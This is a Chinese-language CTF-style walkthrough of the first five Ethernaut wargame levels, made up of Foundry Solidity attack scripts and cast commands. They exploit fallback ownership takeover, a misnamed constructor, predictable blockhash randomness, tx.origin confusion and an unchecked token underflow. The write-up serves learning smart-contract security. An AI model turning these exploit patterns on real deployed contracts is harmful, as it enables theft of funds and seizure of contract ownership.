# [The Ethernaut](https://ethernaut.openzeppelin.com)

一个非常有意思的网站，提供了一系列题目

以下内容(可能)省略：
- instance合约地址
- rpc url
- 私钥
- player地址

## Fallback

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Fallback} from "../src/Fallback.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
contract AttackScript is Script{
    function run() public{
        vm.startBroadcast();
        new Attack{value: 0.0000000000002 ether}().exploit();
        console.log("Attack Success");
        vm.stopBroadcast();
    }
}
contract Attack{
    Fallback public target = Fallback(payable(address()));
    constructor() payable {
        require(msg.value >= 0.000000000000002 ether);
    }
    function exploit() public{
        target.contribute{value: 0.000000000000001 ether}();
        (bool success, ) = payable(target).call{value: 0.000000000000001 ether, gas: 500000}(""); //gas要给够
        require(success, "Receive failed");
    }
}
```
但是吧，这只会让owner变成上述合约，而题目要求owner为player，即metamask里登记的账号。需要手动cast send更新owner
```sh
cast send "" "contribute()" --from "" --value 0.0000000000000011ether
cast send "" "withdraw()" --from ""
```
## Fallout

并非constructor（

```sh
cast send "" "Fal1out()" --from ""
cast send "" "collectAllocations()" --from ""
```

## Coin Flip

`block.number`是可以预测的。一个要注意的地方是，题目检查了`lastHash != blockValue`，因此两个转账之间不能太快，要给`block.number`自增的时间
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {CoinFlip} from "../src/CoinFlip.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
contract AttackScript is Script {
    function run() public {
        vm.startBroadcast();
        new Attack().exploit();
        vm.stopBroadcast();
    }
}
contract Attack {
    CoinFlip public target = CoinFlip(address());
    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    function exploit() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        target.flip((blockValue / FACTOR) == 1);
    }
}
```
```sh
for i in {1..10}; do
    forge script script/Attack.s.sol:AttackScript --rpc-url $ETH_RPC_URL --private-key $PRIVATE_KEY --broadcast
    sleep 15
done
```
## Telephone

简单来说，可以将`msg.sender`理解成调用函数的合约地址；而`tx.origin`是调用链的原始发起者，比如用户的钱包地址。只要用foundry来解这题（remix应该也行，但我配置不好……），两者就一定不一样
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Telephone} from "../src/Telephone.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
contract AttackScript is Script {
    function run() public {
        vm.startBroadcast();
        new Attack().exploit();
        vm.stopBroadcast();
    }
}
contract Attack {
    Telephone public target = Telephone(address());
    function exploit() public {
        target.changeOwner(address());
    }
}
```
## Token

balances用uint256存储token数量，但没检查溢出
```sh
cast send "" "transfer(address,uint256)" "任意一个不等于player的地址" 21 --from ""
```